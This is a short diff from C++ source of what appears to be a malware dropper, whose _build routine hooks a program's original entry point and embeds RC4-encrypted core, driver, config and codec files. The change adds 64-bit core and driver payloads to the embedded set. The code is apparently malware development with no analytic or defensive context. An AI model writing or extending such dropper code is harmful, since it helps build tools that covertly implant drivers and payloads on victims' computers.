@@ -143,7 +143,9 @@ DWORD DropperObject::_build( WINSTARTFUNC OriginalEntryPoint )
 	
 	// embed core, driver, config and codec files
 	ptr = _embedFile(header->rc4key, _files.core, header->files.names.core, header->files.core, ptr);
+	ptr = _embedFile(header->rc4key, _files.core64, header->files.names.core64, header->files.core64, ptr);
 	ptr = _embedFile(header->rc4key, _files.driver, header->files.names.driver, header->files.driver, ptr);
+	ptr = _embedFile(header->rc4key, _files.driver64, header->files.names.driver64, header->files.driver64, ptr);
 	ptr = _embedFile(header->rc4key, _files.config, header->files.names.config, header->files.config, ptr);
 	ptr = _embedFile(header->rc4key, _files.codec, header->files.names.codec, header->files.codec, ptr);
 	
